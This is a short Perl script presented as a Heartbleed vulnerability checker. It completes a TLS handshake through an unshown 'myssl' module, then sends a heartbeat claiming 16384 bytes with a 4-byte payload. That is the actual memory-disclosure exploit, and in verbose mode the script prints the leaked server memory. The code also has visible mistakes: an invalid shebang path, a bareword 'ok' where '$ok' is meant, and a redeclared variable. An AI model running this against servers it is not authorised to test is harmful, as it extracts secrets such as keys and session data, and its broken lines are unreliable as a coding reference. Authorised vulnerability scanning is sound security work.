#! /bin/usr/perl

# Аргументы:        
#	heartbleed.pl x.x.x.x|hostname [port]
#	heartbleed.pl --help

use lib ".";
use myssl;
use Getopt::Long qw(:config posix_default bundling);
use Data::Dumper;

my $host;
my $port = 443;
my $verbose = 0;

sub showHelp {
	print STDERR <<USAGE;

Check if server is vulnerable against heartbleed SSL attack.

Usage: $0 [options] host [port]

-h|--help       - this screen.
-v|--verbose    - verbose mode.
host            - hostname or IPv4 address.
port            - port (default 443).

USAGE
}

GetOptions(
	'h|help' => sub { showHelp(); exit(0); },
	'v|verbose' => \$verbose,
);

if (!@ARGV) {
	print STDERR "Error: no arguments.\n";
	showHelp();
	exit(1);
} else {
	$host = $ARGV[0];
	if (defined $ARGV[1]) {
		$port = $ARGV[1]
	}
}

my $myssl = MySSL->new();
die "Error: $!" if !$myssl->connect($host, $port);

$myssl->{protocolVersion} = [3, 1];
$myssl->{ciphers} = $myssl->getOpenSSLCiphers('tls1');

print "Send ClientHello...\n";
$myssl->clientHello();
my $buf = '';
my $ok = $myssl->getResponse(\$buf);
die "Error: $!" if !defined $ok;
die "Timeout" if !ok;

if ($verbose) {
	my $data = $myssl->parseTLSPlaintext($buf);
	print "TLS DATA\n\n\n".Dumper($data)."\n\n\n";
}

print "Send Heartbeat...\n";
$myssl->heartbeat(16384, 'test');
$buf = '';
my $ok = $myssl->getResponse(\$buf);
die "Error: $!" if !defined $ok;
if (!$ok) {
	print "Timed out after heartbeat. Possibly not vulnerable.\n";
	exit(0);
}
$data = $myssl->parseTLSPlaintext($buf);
if ($data->[0]->{contentType} != 24) {
	print "Received different data than heartbeat response. Content type: ".($data->[0]->{contentType})."\n";
	exit(0);
}
print "Received heartbeat.\n";
if ($verbose) { print Dumper($data->[0])."\n"; }
my $a = length($data->[0]->{heartbeat}->{payload});
my $b = length('test');
if ($a > $b) {
	printf ("Vulnerable: received %d bytes of data instead of %d.\n", $a, $b);
} elsif ($a == $b) {
	print "Received data with proper length. Not vulnerable.\n";
}